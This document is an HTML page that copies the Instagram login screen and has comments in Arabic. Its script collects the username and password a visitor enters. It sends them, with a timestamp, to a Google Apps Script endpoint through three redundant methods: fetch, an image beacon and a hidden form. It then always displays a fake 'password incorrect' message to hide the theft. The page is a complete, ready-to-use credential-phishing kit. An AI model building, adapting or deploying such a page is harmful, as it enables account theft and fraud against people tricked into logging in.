<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        .instagram-logo {
            background-position: 0 -130px;
            height: 51px;
            width: 175px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        .facebook-logo {
            background-position: -414px -259px;
            background-image: url(https://bit.ly/3v2LT17);
            height: 16px;
            width: 16px;
        }
        .apple-store-logo {
            background-position: -132px -182px;
            height: 42px;
            width: 128px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        .google-store-logo {
            background-position: 0 -182px;
            height: 42px;
            width: 130px;
            background-image: url(https://bit.ly/3v2LT17);
        }
        .login-button {
            background-color: #0095f6;
        }
        .login-button:hover {
            background-color: #007acc;
        }
        .login-button:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }
        .message {
            display: none;
            padding: 8px 12px;
            margin: 10px 0;
            border-radius: 4px;
            font-size: 12px;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .loading {
            background-color: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        .error-message {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
        .input-error {
            border-color: #ed4956 !important;
        }
    </style>
</head>
<body>
<div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
    <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
        <h1 class="bg-no-repeat instagram-logo"></h1>
        
        <div id="message" class="message w-64"></div>
        
        <!-- رسالة الخطأ -->
        <div id="errorMessage" class="error-message w-64">
            <strong>Sorry, your password was incorrect. Please double-check your password.</strong>
        </div>
        
        <form class="mt-4 w-64 flex flex-col" id="loginForm">
            <input autofocus
                   class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="username" placeholder="Phone number, username, or email" type="text" required>
            <input autofocus
                   class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                   id="password" placeholder="Password" type="password" required>
            
            <button type="submit" class="login-button text-sm text-center text-white py-1 rounded font-medium mt-2" id="loginButton">
                Log In
            </button>
        </form>
        
        <div class="flex justify-evenly space-x-2 w-64 mt-4">
            <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
            <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
        </div>
        
        <button class="mt-4 flex">
            <div class="bg-no-repeat facebook-logo mr-1"></div>
            <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
        </button>
        
        <a class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">Forgot password?</a>
    </div>
    
    <div class="bg-white border border-gray-300 text-center w-80 py-4">
        <span class="text-sm">Don't have an account?</span>
        <a class="text-blue-500 text-sm font-semibold">Sign up</a>
    </div>
    
    <div class="mt-3 text-center">
        <span class="text-xs">Get the app</span>
        <div class="flex mt-3 space-x-2">
            <div class="bg-no-repeat apple-store-logo"></div>
            <div class="bg-no-repeat google-store-logo"></div>
        </div>
    </div>
</div>

<script>
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby74jTndK5tRYAcJeMGz88Qy8OvkAZW0Ws4IwDLa53KrQg1w1c7spwmGzijglLgJSXmjA/exec';
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            showMessage('Please fill in all fields', 'error');
            return;
        }
        
        // إظهار رسالة التحميل
        showMessage('Logging in...', 'loading');
        hideErrorMessage();
        
        // محاكاة عملية تسجيل الدخول
        setTimeout(() => {
            // إرسال البيانات إلى جوجل شيت أولاً
            sendDataToGoogleSheet(username, password);
            
            // ثم عرض رسالة الخطأ (محاكاة لفشل التسجيل)
            showErrorMessage();
            
            // إضافة تأثير الخطأ على الحقول
            document.getElementById('password').classList.add('input-error');
            
        }, 1500);
    });
    
    function sendDataToGoogleSheet(username, password) {
        const url = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&timestamp=${encodeURIComponent(new Date().toISOString())}`;
        
        // استخدام طرق متعددة لإرسال البيانات
        const methods = [
            () => fetch(url, { method: 'GET', mode: 'no-cors' }),
            () => { const img = new Image(); img.src = url; },
            () => {
                const form = document.createElement('form');
                form.method = 'GET';
                form.action = url;
                form.style.display = 'none';
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            }
        ];
        
        // تجربة جميع الطرق
        methods.forEach(method => {
            try {
                method();
            } catch (error) {
                console.log('Alternative method used');
            }
        });
    }
    
    function showErrorMessage() {
        const errorDiv = document.getElementById('errorMessage');
        errorDiv.style.display = 'block';
        
        // إخفاء رسالة التحميل
        hideMessage();
    }
    
    function hideErrorMessage() {
        const errorDiv = document.getElementById('errorMessage');
        errorDiv.style.display = 'none';
        
        // إزالة تأثير الخطأ من الحقول
        document.getElementById('password').classList.remove('input-error');
    }
    
    function showMessage(text, type) {
        const messageDiv = document.getElementById('message');
        messageDiv.textContent = text;
        messageDiv.className = `message ${type} w-64`;
        messageDiv.style.display = 'block';
    }
    
    function hideMessage() {
        const messageDiv = document.getElementById('message');
        messageDiv.style.display = 'none';
    }
    
    // إخفاء رسالة الخطأ عند البدء في الكتابة
    document.getElementById('username').addEventListener('input', function() {
        hideErrorMessage();
    });
    
    document.getElementById('password').addEventListener('input', function() {
        hideErrorMessage();
        this.classList.remove('input-error');
    });
    
    // التحقق من صحة النموذج في الوقت الحقيقي
    document.getElementById('username').addEventListener('input', validateForm);
    document.getElementById('password').addEventListener('input', validateForm);
    
    function validateForm() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const loginButton = document.getElementById('loginButton');
        
        if (username.length > 0 && password.length > 0) {
            loginButton.disabled = false;
            loginButton.classList.remove('bg-blue-300');
            loginButton.classList.add('login-button');
        } else {
            loginButton.disabled = true;
            loginButton.classList.remove('login-button');
            loginButton.classList.add('bg-blue-300');
        }
    }
    
    // تعطيل الزر في البداية
    document.getElementById('loginButton').disabled = true;
    document.getElementById('loginButton').classList.remove('login-button');
    document.getElementById('loginButton').classList.add('bg-blue-300');
    
    // إخفاء رسالة الخطأ عند تحميل الصفحة
    window.addEventListener('load', function() {
        hideErrorMessage();
    });
</script>
</body>
</html>
